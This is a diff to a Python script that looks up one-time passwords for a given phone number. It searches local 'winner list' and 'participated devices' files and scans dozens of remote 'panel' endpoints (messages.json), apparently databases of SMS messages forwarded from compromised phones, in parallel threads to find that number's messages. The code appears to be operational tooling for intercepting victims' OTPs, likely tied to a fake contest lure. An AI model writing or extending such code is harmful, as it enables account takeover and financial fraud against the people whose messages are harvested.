@@ -568,8 +568,67 @@ def fetch_otp_for_phone(phone_input):
     panel_url = info.get("panel_url") if isinstance(info, dict) else None
     client_id = info.get("client_id") if isinstance(info, dict) else None
 
-    # If unmapped, perform quick scan across panels.txt
-    if not panel_url or not client_id:
+    # Check successful_participated_devices.json if not in device_index
+    if not panel_url or not client_id or client_id == "Default Panel Device":
+        succ_file = "successful_participated_devices.json"
+        if os.path.exists(succ_file):
+            try:
+                with open(succ_file, "r", encoding="utf-8") as sf:
+                    succ_data = json.load(sf)
+                    for item in succ_data:
+                        if isinstance(item, dict) and item.get("phone") == clean_phone:
+                            panel_url = item.get("panel_url")
+                            if item.get("client_id") and item.get("client_id") != "Default Panel Device":
+                                client_id = item.get("client_id")
+                            break
+            except Exception:
+                pass
+
+    # Check cremica_master_winner_list.txt if still unmapped
+    if not panel_url:
+        master_file = "cremica_master_winner_list.txt"
+        if os.path.exists(master_file):
+            try:
+                with open(master_file, "r", encoding="utf-8", errors="ignore") as mf:
+                    content = mf.read()
+                    blocks = content.split("--------------------------------------------------")
+                    for b in blocks:
+                        if clean_phone in b:
+                            panel_m = re.search(r"Panel:\s*([^\n]+)", b)
+                            if panel_m:
+                                panel_url = parse_firebase_link(panel_m.group(1))
+                                break
+            except Exception:
+                pass
+
+    # If panel_url known but client_id unknown/default, search client_id on that panel
+    headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
+    if panel_url and (not client_id or client_id == "Default Panel Device"):
+        try:
+            resp = requests.get(f"{panel_url.rstrip('/')}/messages.json", headers=headers, timeout=4)
+            if resp.status_code == 200:
+                data = resp.json() or {}
+                if isinstance(data, dict):
+                    for cid, device_msgs in data.items():
+                        if isinstance(device_msgs, dict):
+                            for m in device_msgs.values():
+                                if isinstance(m, dict):
+                                    t = str(m.get("body") or m.get("message") or m.get("text") or "")
+                                    if clean_phone in t:
+                                        client_id = cid
+                                        # Save mapping
+                                        device_index[clean_phone] = {"panel_url": panel_url, "client_id": client_id}
+                                        try:
+                                            with open(device_index_file, "w", encoding="utf-8") as jf:
+                                                json.dump(device_index, jf, indent=2)
+                                        except Exception:
+                                            pass
+                                        break
+        except Exception:
+            pass
+
+    # Fallback parallel scan across all 69 panels if still completely unmapped
+    if not panel_url or not client_id or client_id == "Default Panel Device":
         panel_urls = []
         if os.path.exists("panels.txt"):
             with open("panels.txt", "r", encoding="utf-8") as f:
@@ -578,11 +637,9 @@ def fetch_otp_for_phone(phone_input):
                     if p:
                         panel_urls.append(p)
 
-        headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
-
-        def scan_panel(p_url):
+        def scan_panel_fast(p_url):
             try:
-                resp = requests.get(f"{p_url.rstrip('/')}/messages.json", headers=headers, timeout=6)
+                resp = requests.get(f"{p_url.rstrip('/')}/messages.json", headers=headers, timeout=3.5)
                 if resp.status_code == 200:
                     data = resp.json() or {}
                     if isinstance(data, dict):
@@ -597,14 +654,13 @@ def fetch_otp_for_phone(phone_input):
                 pass
             return None, None
 
-        with ThreadPoolExecutor(max_workers=20) as executor:
-            futures = [executor.submit(scan_panel, u) for u in panel_urls]
+        with ThreadPoolExecutor(max_workers=30) as executor:
+            futures = [executor.submit(scan_panel_fast, u) for u in panel_urls]
             for f in as_completed(futures):
                 p_u, c_i = f.result()
                 if p_u and c_i:
                     panel_url = p_u
                     client_id = c_i
-                    # Save mapping for future 50ms direct lookup
                     device_index[clean_phone] = {"panel_url": panel_url, "client_id": client_id}
                     try:
                         with open(device_index_file, "w", encoding="utf-8") as jf:
@@ -613,7 +669,7 @@ def fetch_otp_for_phone(phone_input):
                         pass
                     break
 
-    if not panel_url or not client_id:
+    if not panel_url or not client_id or client_id == "Default Panel Device":
         return {"status": "not_found", "message": f"Phone {clean_phone} not found on any panel", "phone": clean_phone}
 
     # Fetch messages from direct endpoint
